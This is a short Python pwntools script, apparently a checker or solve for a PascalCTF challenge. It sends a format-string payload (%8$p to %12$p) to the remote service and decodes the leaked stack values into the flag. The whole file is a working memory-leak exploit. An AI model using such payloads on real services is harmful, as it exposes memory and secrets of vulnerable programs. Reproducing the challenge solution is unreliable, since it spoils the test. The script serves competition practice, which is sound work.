#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import remote, context

def checker():
    r = remote(DOMAIN, PORT)

    r.recvuntil(b'?\n')
    PAYLOAD = b''
    for i in range(8, 13):
        PAYLOAD += f'%{i}$p'.encode()

    r.sendline(PAYLOAD)
    flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
    pascal = ''
    for i in flag:
        pascal += i.to_bytes(8, 'little').decode()

    pascal = pascal.replace('\x00', '')
    print(pascal)


if __name__ == '__main__':
    DOMAIN = "elia.challs.pascalctf.it"
    PORT = 1339

    context.log_level = 'error'

    checker()